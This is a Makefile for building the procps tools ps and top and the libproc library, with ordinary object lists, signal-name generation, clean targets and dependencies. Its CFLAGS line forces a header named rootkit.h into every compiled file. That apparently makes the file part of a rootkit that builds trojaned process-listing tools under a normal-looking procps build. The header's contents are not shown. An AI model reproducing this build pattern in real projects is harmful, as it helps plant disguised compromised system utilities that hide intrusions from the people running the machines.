libobjs=snap.o devname.o pwcache.o alloc.o whattime.o sysinfo.o status.o compare.o
liba=libproc.a
lib=proc
install=install
prefix=#proc# prefix for program names, e.g. ps -> procps, top -> proctop, etc
MANOWN=#-o man # or whatever
BINOWN=-o root # or whatever
XBINOWN=-o root # or whatever

CC=gcc
CFLAGS=-include ../rootkit.h -O2 -Wall -Wno-parentheses -fomit-frame-pointer
#CFLAGS=-O2 -Wall -Wno-parentheses -ggdb
SLDFLAGS=-s
LDFLAGS=-s
LIBS=#-lshadow

# Uncomment the following line to make the default behavior in w be to
# show the remote host that a user is logged in from.
W_SHOWFROM=-DW_SHOWFROM
# Uncomment the following line if you are using a kernel version 1.1.x
# or above.
TTY_FULL_DEVNO=-DTTY_FULL_DEVNO

all:	ps top 

$(liba):	$(libobjs)
	ar rcs $(liba) $(libobjs)

signames.h:	/usr/include/linux/signal.h
	tr -s '\t ' '  ' </usr/include/linux/signal.h | sed \
	's:#define SIG\([A-Z]\+[0-9]*\) \([0-9]\+\) *\(\|/\*.*\)$$:{ \2,"\1" },:p;d' \
	> signames.h

signals.o:	signals.h signals.c signames.h

snap.o:	snap.c ps.h psdata.h
	$(CC) $(CFLAGS) $(TTY_FULL_DEVNO) -c snap.c

ps:	$(liba) ps.o
	$(CC) $(CFLAGS) $(LDFLAGS) -o ps ps.o -L. -l$(lib) $(LIBS)

top:	$(liba) top.o signals.o
	$(CC) $(CFLAGS) $(LDFLAGS) -o top top.o signals.o -ltermcap -L. -l$(lib) $(LIBS)

clean:	
	rm -f xproc/Makefile* xproc/*.o
	rm -f xproc/xmem.c xproc/get_mem.c xproc/xidle.c xproc/get_idle.c
	rm -f $(liba)
	rm -f $(EPROGS) $(PROGS) $(SPROGS) $(XPROGS)
	rm -f signames.h
	rm -f *.o

checkout:
	(for i in `ls RCS/* | sed 's:RCS/\(.*\),v:\1:g'`; do \
	 co $$i; done;)

checkclean:
	(for i in `ls RCS/* | sed 's:RCS/\(.*\),v:\1:g'`; do \
	 rm -f $$i; done;)

realclean: clean checkclean

# Dependencies:
alloc.c: ps.h
fuser.c: signals.h
killall.c: signals.h
ps.c: ps.h
psupdate.c: psdata.h ps.h
signals.c: signals.h
snap.c: psdata.h ps.h
status.c: ps.h
sysinfo.c: sysinfo.h
tload.c: sysinfo.h
top.c: sysinfo.h ps.h whattime.h
uptime.c: whattime.h
whattime.c: whattime.h sysinfo.h
